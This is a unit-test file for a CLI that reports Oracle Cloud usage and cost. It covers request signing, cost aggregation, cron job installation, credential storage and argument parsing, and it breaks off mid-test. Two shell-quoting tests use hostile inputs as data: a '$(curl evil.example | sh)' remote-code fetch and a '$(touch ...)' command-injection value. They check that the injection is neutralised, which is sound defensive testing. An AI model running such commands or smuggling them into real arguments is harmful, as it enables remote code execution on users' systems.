// Pure-logic tests — no live OCI/keyring/network calls.
// Run against compiled output with: node --test dist/test/unit.test.js

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { createVerify, createPublicKey } from 'node:crypto'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { execFileSync } from 'node:child_process'

import { parseOciConfig } from '../src/config.js'
import { signRequest } from '../src/signer.js'
import {
  aggregateUsageAndCost,
  isFreeTierSkuName,
  monthRange,
  lastMonthRange,
  queryUsageAndCost,
  queryMultiProfile,
  type OciRequestFn,
} from '../src/usage.js'
import { applyFilters, freeTierOffenders, filterByServices } from '../src/presets.js'
import { isValidCronExpression, installCronJob, uninstallCronJob, listCronJobs, shellQuoteArg } from '../src/cron-install.js'
import { saveTelegramCredential, loadTelegramCredential, maskToken, configFilePath } from '../src/credentials.js'
import { fetchLatestVersion, compareVersions } from '../src/update.js'
import {
  errMessage,
  resolveHelpTarget,
  resolveVersionRequested,
  buildScheduledCommand,
  parseQueryFlags,
  parseCronArgs,
  parseSetTelegramArgs,
  trailingHasPlaintextTelegramTokenRisk,
} from '../src/main.js'
import type { Profile, UsageQueryRange } from '../src/types.js'
import {
  generateTestKeyPair,
  SAMPLE_OCI_CONFIG,
  sampleUsageItems,
  sampleCostItemsAllFree,
  sampleCostItemsWithOverage,
  sampleCostItemsMixedNonUsdCurrencies,
} from './fixtures.js'

const { privateKeyPem: TEST_PRIVATE_KEY_PEM } = generateTestKeyPair()

// --- config.ts -----------------------------------------------------------

test('parseOciConfig reads every [SECTION], not just [DEFAULT]', () => {
  const { profiles } = parseOciConfig(SAMPLE_OCI_CONFIG)
  assert.equal(profiles.size, 2) // BROKEN is excluded
  assert.ok(profiles.has('DEFAULT'))
  assert.ok(profiles.has('US'))
  assert.equal(profiles.get('US')?.region, 'us-phoenix-1')
  assert.equal(profiles.get('DEFAULT')?.region, 'ap-chuncheon-1')
})

test('parseOciConfig reports malformed profiles without dropping the others', () => {
  const { profiles, errors } = parseOciConfig(SAMPLE_OCI_CONFIG)
  assert.equal(errors.length, 1)
  assert.equal(errors[0].section, 'BROKEN')
  assert.match(errors[0].message, /fingerprint/)
  assert.match(errors[0].message, /tenancy/)
  assert.ok(!profiles.has('BROKEN'))
})

// --- signer.ts -------------------------------------------------------------

const TEST_PROFILE: Profile = {
  name: 'DEFAULT',
  user: 'ocid1.user.oc1..aaaatest',
  fingerprint: 'aa:bb:cc:dd',
  tenancy: 'ocid1.tenancy.oc1..aaaatest',
  region: 'ap-chuncheon-1',
  keyFile: '/unused/in/this/test',
}

test('signRequest builds a GET signing string with the (request-target) date host headers only', () => {
  const signed = signRequest(TEST_PROFILE, TEST_PRIVATE_KEY_PEM, {
    method: 'GET',
    host: 'example.oraclecloud.com',
    path: '/v1/resource',
    date: 'Mon, 01 Jul 2026 00:00:00 GMT',
  })
  assert.match(signed.authorization, /headers="\(request-target\) date host"/)
  assert.ok(!('content-length' in signed.headers))
})

test('signRequest builds a POST signing string including body-hash headers, and the signature verifies', () => {
  const body = JSON.stringify({ hello: 'world' })
  const date = 'Mon, 01 Jul 2026 00:00:00 GMT'
  const signed = signRequest(TEST_PROFILE, TEST_PRIVATE_KEY_PEM, {
    method: 'POST',
    host: 'usageapi.ap-chuncheon-1.oci.oraclecloud.com',
    path: '/20200107/usage',
    date,
    body,
  })

  assert.match(
    signed.authorization,
    /headers="\(request-target\) date host content-length content-type x-content-sha256"/,
  )
  assert.match(signed.authorization, new RegExp(`keyId="${TEST_PROFILE.tenancy}/${TEST_PROFILE.user}/${TEST_PROFILE.fingerprint}"`))

  // Reconstruct the exact signing string and verify the embedded signature
  // against the corresponding public key — proves signRequest produces a
  // real, valid RSA-SHA256 signature, not just a plausible-looking string.
  const sigMatch = signed.authorization.match(/signature="([^"]+)"/)
  assert.ok(sigMatch)
  const signingString =
    `(request-target): post /20200107/usage\ndate: ${date}\nhost: usageapi.ap-chuncheon-1.oci.oraclecloud.com` +
    `\ncontent-length: ${signed.headers['content-length']}` +
    `\ncontent-type: application/json` +
    `\nx-content-sha256: ${signed.headers['x-content-sha256']}`

  const verifier = createVerify('RSA-SHA256')
  verifier.update(signingString)
  const publicKey = createPublicKey(TEST_PRIVATE_KEY_PEM)
  assert.ok(verifier.verify(publicKey, sigMatch[1], 'base64'))
})

// --- usage.ts ----------------------------------------------------------

test('isFreeTierSkuName matches OCI Always Free SKU naming', () => {
  assert.ok(isFreeTierSkuName('Virtual Machine Standard - E2 Micro - Free'))
  assert.ok(isFreeTierSkuName('Block Volume - Free'))
  assert.ok(!isFreeTierSkuName('Standard - A1'))
})

test('monthRange defaults to the current UTC month and last-month rolls over year boundaries', () => {
  const now = new Date()
  const r = monthRange()
  assert.equal(r.start.getUTCFullYear(), now.getUTCFullYear())
  assert.equal(r.start.getUTCMonth(), now.getUTCMonth())
  assert.equal(r.start.getUTCDate(), 1)

  const explicit = monthRange('2026-01')
  assert.equal(explicit.start.toISOString(), '2026-01-01T00:00:00.000Z')
  assert.equal(explicit.end.toISOString(), '2026-02-01T00:00:00.000Z')

  const dec = monthRange('2025-12')
  assert.equal(dec.end.toISOString(), '2026-01-01T00:00:00.000Z')
})

test('lastMonthRange rolls over the year boundary from January', () => {
  // lastMonthRange() itself is not independently mockable against "now", but
  // its December-rollover logic is exercised via the monthRange('2025-12')
  // case above; here we at least confirm it delegates to monthRange and
  // returns a well-formed one-month range for whatever "now" actually is.
  const r = lastMonthRange()
  assert.equal(r.start.getUTCDate(), 1)
  assert.equal(r.end.getUTCDate(), 1)
  assert.ok(r.end.getTime() > r.start.getTime())
})

test('monthRange rejects out-of-range or malformed --month input instead of silently rolling over', () => {
  // Date.UTC() normalizes out-of-range month indices instead of throwing —
  // without explicit validation, '2026-13' would silently become a
  // Jan-Feb 2027 range and '2026-00' would silently become Dec 2025, with
  // no error surfaced to the user of a cost-reporting tool.
  assert.throws(() => monthRange('2026-13'), /invalid --month/)
  assert.throws(() => monthRange('2026-00'), /invalid --month/)
  assert.throws(() => monthRange('2026-foo'), /invalid --month/)
  assert.throws(() => monthRange('2026-1'), /invalid --month/) // must be zero-padded, per README's YYYY-MM
  assert.throws(() => monthRange('not-a-month'), /invalid --month/)
})

test('aggregateUsageAndCost prefers USD when a SKU appears in multiple currencies', () => {
  const { lineItems } = aggregateUsageAndCost(sampleUsageItems(), sampleCostItemsAllFree())
  const compute = lineItems.find((i) => i.skuName.includes('E2 Micro'))
  assert.ok(compute)
  assert.equal(compute!.currency, 'USD') // not SGD, even though SGD appeared first
  assert.equal(compute!.cost, 0)
})

test('aggregateUsageAndCost sums non-USD entries only when no USD entry exists for that SKU', () => {
  const { lineItems } = aggregateUsageAndCost(sampleUsageItems(), sampleCostItemsAllFree())
  const storage = lineItems.find((i) => i.skuName.includes('Block Volume'))
  assert.ok(storage)
  assert.equal(storage!.currency, 'SGD') // only currency present for this SKU
})

test('aggregateUsageAndCost surfaces a real overage as a non-free line item with cost > 0', () => {
  const { lineItems } = aggregateUsageAndCost(sampleUsageItems(), sampleCostItemsWithOverage())
  const overage = lineItems.find((i) => i.skuName === 'Standard - A1')
  assert.ok(overage)
  assert.equal(overage!.cost, 4.2)
  assert.equal(overage!.isFreeTierSku, false)
})

test('aggregateUsageAndCost sums outbound transfer GB via case-insensitive SKU match', () => {
  const { outboundGB } = aggregateUsageAndCost(sampleUsageItems(), sampleCostItemsAllFree())
  assert.ok(Math.abs(outboundGB - 11.559428631747) < 1e-9)
})

test('aggregateUsageAndCost keeps every distinct non-USD currency as its own line item instead of dropping data (regression for issue #22 finding 3)', () => {
  // Old behavior: a SKU billed in SGD then EUR (no USD ever present) kept
  // only the first-seen currency (SGD) and silently discarded the EUR
  // entry — not summed, not flagged, just gone.
  const { lineItems } = aggregateUsageAndCost(sampleUsageItems(), sampleCostItemsMixedNonUsdCurrencies())
  const outbound = lineItems.filter((i) => i.skuName === 'Outbound Data Transfer Zone 2')
  assert.equal(outbound.length, 2)
  const sgd = outbound.find((i) => i.currency === 'SGD')
  const eur = outbound.find((i) => i.currency === 'EUR')
  assert.ok(sgd, 'SGD entry must survive')
  assert.ok(eur, 'EUR entry must not be silently dropped')
  assert.equal(sgd!.cost, 1.5)
  assert.equal(eur!.cost, 2.25)
  // Currencies are still never summed together across different currencies.
  assert.notEqual(sgd!.cost, sgd!.cost + eur!.cost)
})

test('aggregateUsageAndCost still sums same-currency entries when no USD is present, even with 3+ cost items for one SKU', () => {
  const costItems = [
    ...sampleCostItemsMixedNonUsdCurrencies(),
    { service: 'Virtual Cloud Network', skuName: 'Outbound Data Transfer Zone 2', skuPartNumber: 'B88514', unit: null, computedQuantity: null, currency: 'SGD', computedAmount: 0.5 },
  ]
  const { lineItems } = aggregateUsageAndCost(sampleUsageItems(), costItems)
  const outbound = lineItems.filter((i) => i.skuName === 'Outbound Data Transfer Zone 2')
  assert.equal(outbound.length, 2) // still one row per distinct currency
  const sgd = outbound.find((i) => i.currency === 'SGD')
  assert.equal(sgd!.cost, 2) // 1.5 + 0.5, same-currency entries summed
})

// --- presets.ts --------------------------------------------------------

test('freeTierOffenders returns nothing when every item is a $0 "- Free" SKU', () => {
  const { lineItems } = aggregateUsageAndCost(sampleUsageItems(), sampleCostItemsAllFree())
  assert.equal(freeTierOffenders(lineItems).length, 0)
})

test('freeTierOffenders flags a real overage item', () => {
  const { lineItems } = aggregateUsageAndCost(sampleUsageItems(), sampleCostItemsWithOverage())
  const offenders = freeTierOffenders(lineItems)
  assert.equal(offenders.length, 1)
  assert.equal(offenders[0].skuName, 'Standard - A1')
})

test('applyFilters preset=compute keeps only Compute-service items', () => {
  const { lineItems } = aggregateUsageAndCost(sampleUsageItems(), sampleCostItemsAllFree())
  const filtered = applyFilters(lineItems, { preset: 'compute' })
  assert.ok(filtered.every((i) => i.service === 'Compute'))
  assert.ok(filtered.length > 0)
})

test('applyFilters rejects an unknown preset name', () => {
  assert.throws(() => applyFilters([], { preset: 'not-a-real-preset' }))
})

test('filterByServices composes with a preset (AND semantics)', () => {
  const { lineItems } = aggregateUsageAndCost(sampleUsageItems(), sampleCostItemsAllFree())
  const filtered = applyFilters(lineItems, { preset: 'network', services: ['virtual cloud network'] })
  assert.ok(filtered.every((i) => i.service === 'Virtual Cloud Network'))
})

// --- cron-install.ts -----------------------------------------------------

test('isValidCronExpression accepts standard 5-field expressions', () => {
  assert.ok(isValidCronExpression('0 0 15 * *'))
  assert.ok(isValidCronExpression('*/15 * * * *'))
  assert.ok(isValidCronExpression('0,30 9-17 * * 1-5'))
})

test('isValidCronExpression rejects malformed expressions', () => {
  assert.ok(!isValidCronExpression('not a cron expression'))
  assert.ok(!isValidCronExpression('0 0 15 *')) // only 4 fields
  assert.ok(!isValidCronExpression('0 0 15 * * *')) // 6 fields
})

test('installCronJob appends a new line and is idempotent on re-run', () => {
  let stored = ''
  const io = {
    read: () => stored,
    write: (content: string) => {
      stored = content
    },
  }
  const first = installCronJob('0 0 15 * *', 'oci-cost-cli report', io)
  assert.equal(first.installed, true)
  assert.equal(first.alreadyPresent, false)
  assert.match(stored, /0 0 15 \* \* oci-cost-cli report/)

  const second = installCronJob('0 0 15 * *', 'oci-cost-cli report', io)
  assert.equal(second.installed, false)
  assert.equal(second.alreadyPresent, true)
  assert.equal(stored.split('\n').filter((l) => l.includes('oci-cost-cli report')).length, 1)
})

test('installCronJob rejects an invalid cron expression before touching crontab', () => {
  let wrote = false
  const io = {
    read: () => '',
    write: () => {
      wrote = true
    },
  }
  assert.throws(() => installCronJob('garbage', 'oci-cost-cli report', io))
  assert.equal(wrote, false)
})

test('shellQuoteArg wraps a plain token in single quotes', () => {
  assert.equal(shellQuoteArg('--service'), "'--service'")
})

test('shellQuoteArg preserves a token containing whitespace as one shell word', () => {
  // Without per-token quoting, joining with a bare space loses this argv
  // boundary — cron would later re-split "Object" and "Storage" into two
  // separate (wrong) tokens.
  assert.equal(shellQuoteArg('Object Storage'), "'Object Storage'")
})

test('shellQuoteArg neutralizes shell metacharacters instead of letting sh -c interpret them', () => {
  const malicious = '$(curl evil.example | sh)'
  const quoted = shellQuoteArg(malicious)
  assert.equal(quoted, `'${malicious}'`)
  // The whole thing is inert inside single quotes — no unescaped `$(`, `|`, backtick, `;` outside the quotes.
  assert.equal(quoted.startsWith("'"), true)
  assert.equal(quoted.endsWith("'"), true)
})

test('shellQuoteArg correctly escapes an embedded single quote', () => {
  // POSIX single-quoting can't represent a literal ' inside '...' — the
  // standard technique is: close quote, escaped literal quote, reopen quote.
  assert.equal(shellQuoteArg("it's"), "'it'\\''s'")
})

test('buildScheduledCommand shell-quotes every token including execPath/scriptPath, and round-trips through sh -c', () => {
  const cmd = buildScheduledCommand(
    ['--service', 'Object Storage', '--dry-run'],
    '/usr/bin/node',
    '/opt/oci-cost-cli/main.js',
  )
  assert.equal(cmd, "'/usr/bin/node' '/opt/oci-cost-cli/main.js' '--service' 'Object Storage' '--dry-run'")
})

test('buildScheduledCommand neutralizes a shell-metacharacter-bearing trailing arg (regression for the crontab injection bug)', () => {
  const cmd = buildScheduledCommand(
    ['--service', '$(touch /tmp/oci-cost-cli-test-pwned)'],
    '/usr/bin/node',
    '/opt/oci-cost-cli/main.js',
  )
  // Round-trip it through an actual shell (exactly how cron would invoke the
  // stored line) and confirm the payload is never executed — echoing the
  // reconstructed command must print the literal string, not run the
  // embedded subshell.
  const out = execFileSync('sh', ['-c', `echo ${cmd}`], { encoding: 'utf8' })
  assert.match(out, /\$\(touch \/tmp\/oci-cost-cli-test-pwned\)/)
})

test('uninstallCronJob removes the exact previously-installed line and leaves others untouched', () => {
  let stored = 'unrelated line here\n'
  const io = {
    read: () => stored,
    write: (content: string) => {
      stored = content
    },
  }
  installCronJob('0 0 15 * *', 'oci-cost-cli report', io)
  assert.match(stored, /oci-cost-cli report/)

  const result = uninstallCronJob('0 0 15 * *', 'oci-cost-cli report', io)
  assert.equal(result.removed, true)
  assert.equal(result.found, true)
  assert.ok(!stored.includes('oci-cost-cli report'))
  assert.ok(stored.includes('unrelated line here')) // untouched
})

test('uninstallCronJob reports not-found without touching the crontab when the line is absent', () => {
  let wrote = false
  const io = {
    read: () => 'some other line\n',
    write: () => {
      wrote = true
    },
  }
  const result = uninstallCronJob('0 0 15 * *', 'oci-cost-cli report', io)
  assert.equal(result.removed, false)
  assert.equal(result.found, false)
  assert.equal(wrote, false)
})

test('uninstallCronJob honors dryRun — reports found but never calls write()', () => {
  let wrote = false
  const io = {
    read: () => '0 0 15 * * oci-cost-cli report\n',
    write: () => {
      wrote = true
    },
  }
  const result = uninstallCronJob('0 0 15 * *', 'oci-cost-cli report', io, true)
  assert.equal(result.found, true)
  assert.equal(result.removed, false)
  assert.equal(result.dryRun, true)
  assert.equal(wrote, false)
})

test('listCronJobs returns only lines matching the oci-cost-cli marker', () => {
  const io = {
    read: () => '0 0 15 * * oci-cost-cli report\n0 3 * * * some-other-tool --flag\n',
    write: () => {},
  }
  const lines = listCronJobs(io)
  assert.equal(lines.length, 1)
  assert.match(lines[0], /oci-cost-cli report/)
})

test('listCronJobs returns an empty array when nothing is installed', () => {
  const io = { read: () => '', write: () => {} }
  assert.deepEqual(listCronJobs(io), [])
})

// --- credentials.ts (file-fallback tier only — keyring is injected as unavailable) ---

const noKeyring = async () => null

// os.homedir() reads $HOME on POSIX but %USERPROFILE% on Windows — override
// both so the test is actually isolated to a scratch dir on every platform.
function withTmpHome(t: { after: (fn: () => void) => void }): string {
  const tmpHome = mkdtempSync(join(tmpdir(), 'oci-cost-cli-test-'))
  const originalHome = process.env.HOME
  const originalUserProfile = process.env.USERPROFILE
  process.env.HOME = tmpHome
  process.env.USERPROFILE = tmpHome
  t.after(() => {
    process.env.HOME = originalHome
    process.env.USERPROFILE = originalUserProfile
    rmSync(tmpHome, { recursive: true, force: true })
  })
  return tmpHome
}

test('saveTelegramCredential falls back to a 0600 file when the keyring is unavailable', async (t) => {
  withTmpHome(t)

  const result = await saveTelegramCredential({ botToken: 'test-token-123456', chatId: '999' }, noKeyring)
  assert.equal(result.storedIn, 'file')

  // POSIX mode bits (0600) are only meaningful on POSIX filesystems —
  // Windows/NTFS has no equivalent concept, and Node's chmod there mostly
  // just toggles the read-only attribute (stat().mode comes back as the
  // OS default, e.g. 0o666), not a real permission restriction.
  if (process.platform !== 'win32') {
    const { statSync } = await import('node:fs')
    const stat = statSync(configFilePath())
    assert.equal(stat.mode & 0o777, 0o600)
  }

  const loaded = await loadTelegramCredential(noKeyring)
  assert.deepEqual(loaded, { botToken: 'test-token-123456', chatId: '999' })
})

test('loadTelegramCredential returns null when nothing is stored', async (t) => {
  withTmpHome(t)

  const loaded = await loadTelegramCredential(noKeyring)
  assert.equal(loaded, null)
})

test('maskToken never reveals the middle of a secret', () => {
  const masked = maskToken('123456789012345')
  assert.equal(masked.slice(4, -4), '*'.repeat(masked.length - 8))
  assert.equal(masked.slice(0, 4), '1234')
  assert.equal(masked.slice(-4), '2345')
})

// --- main.ts errMessage ---------------------------------------------------

test('errMessage never returns an empty string for a plain Error', () => {
  assert.equal(errMessage(new Error('boom')), 'boom')
})

test('errMessage falls back to the constructor name for a blank-message Error', () => {
  assert.equal(errMessage(new Error('')), 'Error')
})

test('errMessage unpacks AggregateError.errors when the top-level message is blank', () => {
  // Reproduces the real bug: Node's dual-stack connect() failures (e.g.
  // ETIMEDOUT hit live during a macOS Telegram-send test) throw an
  // AggregateError whose own .message is '' — the detail lives in .errors.
  const agg = new AggregateError([new Error('connect ETIMEDOUT 1.2.3.4:443'), new Error('connect ETIMEDOUT [::1]:443')], '')
  const msg = errMessage(agg)
  assert.notEqual(msg, '')
  assert.match(msg, /ETIMEDOUT/)
})

test('errMessage prefers a non-empty AggregateError.message when present', () => {
  const agg = new AggregateError([new Error('inner')], 'outer message')
  assert.equal(errMessage(agg), 'outer message')
})

// --- update.ts -------------------------------------------------------------

test('compareVersions orders by major, then minor, then patch', () => {
  assert.equal(compareVersions('0.3.0', '0.3.0'), 0)
  assert.equal(compareVersions('0.3.0', '0.3.1'), -1)
  assert.equal(compareVersions('0.3.1', '0.3.0'), 1)
  assert.equal(compareVersions('0.3.0', '0.4.0'), -1)
  assert.equal(compareVersions('1.0.0', '0.99.99'), 1)
})

test('compareVersions treats a missing/non-numeric segment as 0', () => {
  assert.equal(compareVersions('0.3', '0.3.0'), 0)
  assert.equal(compareVersions('0.3', '0.3.1'), -1)
})

test('fetchLatestVersion returns whatever the injected fetcher resolves, without touching the network', async () => {
  const version = await fetchLatestVersion('oci-cost-cli', async (name) => {
    assert.equal(name, 'oci-cost-cli')
    return '9.9.9'
  })
  assert.equal(version, '9.9.9')
})

test('fetchLatestVersion propagates a rejected fetcher', async () => {
  await assert.rejects(
    () => fetchLatestVersion('oci-cost-cli', async () => Promise.reject(new Error('registry unreachable'))),
    /registry unreachable/,
  )
})

// --- main.ts: resolveHelpTarget ---------------------------------------------
// Regression coverage for https://github.com/abruption/oci-cost-cli/issues/17 —
// -h/--help was only checked at argv[0], so subcommand parsers silently
// dropped it and ran for real (report sent a live Telegram message;
// config clear deleted the stored credential).

test('resolveHelpTarget returns null when no help flag is present', () => {
  assert.equal(resolveHelpTarget([]), null)
  assert.equal(resolveHelpTarget(['--profile', 'DEFAULT']), null)
  assert.equal(resolveHelpTarget(['report', '--dry-run']), null)
})

test('resolveHelpTarget returns "general" for a bare -h/--help', () => {
  assert.equal(resolveHelpTarget(['-h']), 'general')
  assert.equal(resolveHelpTarget(['--help']), 'general')
})

test('resolveHelpTarget targets the subcommand even when --help is not argv[0]', () => {
  assert.equal(resolveHelpTarget(['report', '--help']), 'report')
  assert.equal(resolveHelpTarget(['report', '-h']), 'report')
  assert.equal(resolveHelpTarget(['report', '--profile', 'DEFAULT', '--help']), 'report')
  assert.equal(resolveHelpTarget(['install-cron', '--help']), 'install-cron')
  assert.equal(resolveHelpTarget(['config', '--help']), 'config')
  assert.equal(resolveHelpTarget(['update', '--help']), 'update')
})

test('resolveHelpTarget catches the two destructive-side-effect cases from issue #17', () => {
  // report --help must not fall through to querying OCI + sending Telegram
  assert.equal(resolveHelpTarget(['report', '--help']), 'report')
  // config clear --help must not fall through to deleting the stored credential
  assert.equal(resolveHelpTarget(['config', 'clear', '--help']), 'config')
  // update --apply --help must not fall through to running npm install -g
  assert.equal(resolveHelpTarget(['update', '--apply', '--help']), 'update')
})

test('resolveHelpTarget falls back to "general" for an unrecognized leading token', () => {
  assert.equal(resolveHelpTarget(['--profile', 'DEFAULT', '--help']), 'general')
  assert.equal(resolveHelpTarget(['bogus-subcommand', '--help']), 'general')
})

// --- main.ts: resolveVersionRequested -------------------------------------
// Regression coverage for issue #22 finding 4: -v/--version was only ever
// checked at argv[0], unlike -h/--help's whole-argv scan (issue #17's fix).

test('resolveVersionRequested returns false when no version flag is present', () => {
  assert.equal(resolveVersionRequested([]), false)
  assert.equal(resolveVersionRequested(['--profile', 'DEFAULT']), false)
})

test('resolveVersionRequested is true for a bare -v/--version at argv[0]', () => {
  assert.equal(resolveVersionRequested(['-v']), true)
  assert.equal(resolveVersionRequested(['--version']), true)
})

test('resolveVersionRequested scans the whole argv, not just position 0 (regression for issue #22 finding 4)', () => {
  assert.equal(resolveVersionRequested(['--profile', 'DEFAULT', '--version']), true)
  assert.equal(resolveVersionRequested(['--profile', 'DEFAULT', '-v']), true)
  assert.equal(resolveVersionRequested(['report', '--dry-run', '--version']), true)
})

// --- main.ts: parseQueryFlags ----------------------------------------------
// Regression coverage for issue #22 finding 1 (unrecognized/swallowed flags)
// and finding 2 (--preset validated eagerly, before any I/O).

test('parseQueryFlags parses recognized flags into QueryOptions', () => {
  const o = parseQueryFlags(['--profile', 'DEFAULT', '--profile', 'US', '--month', '2026-06', '--raw', '--json'])
  assert.deepEqual(o.profiles, ['DEFAULT', 'US'])
  assert.equal(o.month, '2026-06')
  assert.equal(o.raw, true)
  assert.equal(o.outputFormat, 'json')
})

test('parseQueryFlags rejects a value-consuming flag that would swallow a sibling recognized flag as its value', () => {
  // The exact bug from issue #22: `--service --output json` used to make
  // `--service` blindly consume `--output` as its value (o.services =
  // ['--output']), leaving `json` stray and --output silently defaulting.
  assert.throws(() => parseQueryFlags(['--service', '--output', 'json']), /--service requires a value/)
  assert.throws(() => parseQueryFlags(['--profile', '--month', '2026-06']), /--profile requires a value/)
})

test('parseQueryFlags rejects a value-consuming flag with a missing value at the end of argv', () => {
  assert.throws(() => parseQueryFlags(['--profile']), /--profile requires a value/)
})

test('parseQueryFlags rejects a genuinely unrecognized --xxx flag instead of silently ignoring it', () => {
  // `--profil` (typo for --profile) used to run an unfiltered query instead
  // of erroring.
  assert.throws(() => parseQueryFlags(['--profil', 'DEFAULT']), /unrecognized flag '--profil'/)
})

test('parseQueryFlags validates --preset eagerly (before any I/O), consistent with --output', () => {
  assert.throws(() => parseQueryFlags(['--preset', 'comptue']), /unknown preset 'comptue'/)
  const o = parseQueryFlags(['--preset', 'compute'])
  assert.equal(o.preset, 'compute')
})

test('parseQueryFlags still validates --output eagerly (unchanged baseline behavior)', () => {
  assert.throws(() => parseQueryFlags(['--output', 'yaml']), /invalid --output/)
})

// --- main.ts: parseCronArgs (install-cron / uninstall-cron shared parsing) ---

test('parseCronArgs parses --cron plus the trailing scheduled command', () => {
  const parsed = parseCronArgs(['--cron', '0 0 15 * *', '--', 'report', '--preset', 'free-tier'], 'install-cron')
  assert.ok(parsed)
  assert.equal(parsed!.cronExpr, '0 0 15 * *')
  assert.match(parsed!.command, /report/)
  assert.match(parsed!.command, /free-tier/)
})

test('parseCronArgs rejects a genuinely unrecognized flag before the -- separator', () => {
  assert.throws(() => parseCronArgs(['--cronn', '0 0 15 * *', '--', 'report'], 'install-cron'), /unrecognized flag '--cronn'/)
})

test('parseCronArgs rejects --cron with a missing value instead of swallowing the next flag', () => {
  assert.throws(() => parseCronArgs(['--cron', '--dry-run', '--', 'report'], 'install-cron'), /--cron requires a value/)
})

// --- main.ts: parseSetTelegramArgs (config set-telegram) -------------------

test('parseSetTelegramArgs parses --token/--chat-id/--dry-run', () => {
  const args = parseSetTelegramArgs(['set-telegram', '--token', 'abc', '--chat-id', '123', '--dry-run'])
  assert.equal(args.token, 'abc')
  assert.equal(args.chatId, '123')
  assert.equal(args.dryRun, true)
})

test('parseSetTelegramArgs rejects --token swallowing a sibling recognized flag as its value', () => {
  assert.throws(
    () => parseSetTelegramArgs(['set-telegram', '--token', '--chat-id', '123']),
    /--token requires a value/,
  )
})

test('parseSetTelegramArgs rejects a genuinely unrecognized flag', () => {
  assert.throws(() => parseSetTelegramArgs(['set-telegram', '--tokenn', 'abc']), /unrecognized flag '--tokenn'/)
})

// --- main.ts: trailingHasPlaintextTelegramTokenRisk (install-cron warning) ---

test('trailingHasPlaintextTelegramTokenRisk detects --telegram-token in the scheduled command', () => {
  assert.equal(trailingHasPlaintextTelegramTokenRisk(['report', '--telegram-token', 'live-token']), true)
  assert.equal(trailingHasPlaintextTelegramTokenRisk(['report', '--preset', 'free-tier']), false)
})

// --- usage.ts: queryUsageAndCost / queryMultiProfile (injectable ociRequest seam) ---
// Regression coverage for issue #22 finding 6 — previously untestable
// because fetchUsageItems called ociRequest directly with no DI seam.

const TEST_RANGE: UsageQueryRange = {
  start: new Date('2026-01-01T00:00:00.000Z'),
  end: new Date('2026-02-01T00:00:00.000Z'),
}

function usageApiItemsBody(items: unknown[]): string {
  return JSON.stringify({ items })
}

type FakeResponse = { status: number; body: string } | (() => Promise<{ status: number; body: string }>)

function fakeOciRequest(responses: {
  USAGE?: FakeResponse
  COST?: FakeResponse
  perProfile?: (profileName: string, queryType: 'USAGE' | 'COST') => FakeResponse | undefined
}): OciRequestFn {
  return async (profile, _method, _host, _path, body) => {
    const queryType = (body as { queryType: 'USAGE' | 'COST' }).queryType
    const r = responses.perProfile?.(profile.name, queryType) ?? responses[queryType]
    if (!r) throw new Error(`test fixture has no response configured for queryType ${queryType}`)
    return typeof r === 'function' ? r() : r
  }
}

test('queryUsageAndCost aggregates a successful USAGE + COST response via the injected request function', async () => {
  const requestFn = fakeOciRequest({
    USAGE: { status: 200, body: usageApiItemsBody(sampleUsageItems()) },
    COST: { status: 200, body: usageApiItemsBody(sampleCostItemsWithOverage()) },
  })
  const result = await queryUsageAndCost(TEST_PROFILE, TEST_RANGE, requestFn)
  assert.equal(result.costApiFailed, false)
  assert.equal(result.profileName, 'DEFAULT')
  const overage = result.lineItems.find((i) => i.skuName === 'Standard - A1')
  assert.ok(overage)
  assert.equal(overage!.cost, 4.2)
  assert.ok(result.raw)
  assert.equal(result.raw!.usage.length, sampleUsageItems().length)
})

test('queryUsageAndCost sets costApiFailed=true and populates `error` when the USAGE API throws (network error)', async () => {
  const requestFn = fakeOciRequest({ USAGE: () => Promise.reject(new Error('connect ETIMEDOUT')) })
  const result = await queryUsageAndCost(TEST_PROFILE, TEST_RANGE, requestFn)
  assert.equal(result.costApiFailed, true)
  assert.deepEqual(result.lineItems, [])
  assert.match(result.error ?? '', /ETIMEDOUT/)
})

test('queryUsageAndCost treats a non-200 USAGE response as a failure (not a thrown error) and never queries COST', async () => {
  let costWasQueried = false
  const requestFn = fakeOciRequest({
    USAGE: { status: 500, body: '' },
    perProfile: (_name, queryType) => {
      if (queryType === 'COST') costWasQueried = true
      return undefined
    },
  })
  const result = await queryUsageAndCost(TEST_PROFILE, TEST_RANGE, requestFn)
  assert.equal(result.costApiFailed, true)
  assert.match(result.error ?? '', /HTTP 500/)
  assert.equal(costWasQueried, false)
})

test('queryUsageAndCost surfaces costApiFailed=true (partial failure) when COST fails but USAGE succeeded, without dropping usage line items', async () => {
  const requestFn = fakeOciRequest({
    USAGE: { status: 200, body: usageApiItemsBody(sampleUsageItems()) },
    COST: { status: 500, body: '' },
  })
  const result = await queryUsageAndCost(TEST_PROFILE, TEST_RANGE, requestFn)
  assert.equal(result.costApiFailed, true)
  assert.equal(result.error, undefined) // distinct from the USAGE-throws case, which does set `error`
  assert.equal(result.lineItems.length, sampleUsageItems().length)
  assert.ok(result.lineItems.every((i) => i.cost === null))
})

test('queryMultiProfile queries every profile in parallel and returns one result per profile, in order', async () => {
  const requestFn = fakeOciRequest({
    USAGE: { status: 200, body: usageApiItemsBody(sampleUsageItems()) },
    COST: { status: 200, body: usageApiItemsBody(sampleCostItemsAllFree()) },
  })
  const profiles: Profile[] = [
    { ...TEST_PROFILE, name: 'A' },
    { ...TEST_PROFILE, name: 'B' },
  ]
  const results = await queryMultiProfile(profiles, TEST_RANGE, requestFn)
  assert.deepEqual(results.map((r) => r.profileName), ['A', 'B'])
  assert.ok(results.every((r) => !r.costApiFailed))
})

test('queryMultiProfile maps a rejected per-profile promise into a costApiFailed result via Promise.allSettled, without failing the whole batch', async () => {
  // queryUsageAndCost catches every I/O error internally, so the only way
  // its own returned promise actually rejects (exercising queryMultiProfile's
  // Promise.allSettled fallback branch, as opposed to queryUsageAndCost's
  // own try/catch) is if the synchronous, unguarded aggregateUsageAndCost()
  // call throws. A non-string skuName in an otherwise-well-formed API
  // response — an unsafe type assertion elsewhere lets this through at
  // runtime — reaches skuName.toLowerCase() and throws a real TypeError.
  const malformedUsageBody = JSON.stringify({
    items: [{ service: 'Compute', skuName: 12345, unit: 'X', computedQuantity: 1, computedAmount: 0, currency: null }],
  })
  const requestFn = fakeOciRequest({
    perProfile: (name, queryType) => {
      if (name === 'BAD' && queryType === 'USAGE') return { status: 200, body: malformedUsageBody }
      return queryType === 'USAGE'
        ? { status: 200, body: usageApiItemsBody(sampleUsageItems()) }
        : { status: 200, body: usageApiItemsBody(sampleCostItemsAllFree()) }
    },
  })
  const profiles: Profile[] = [
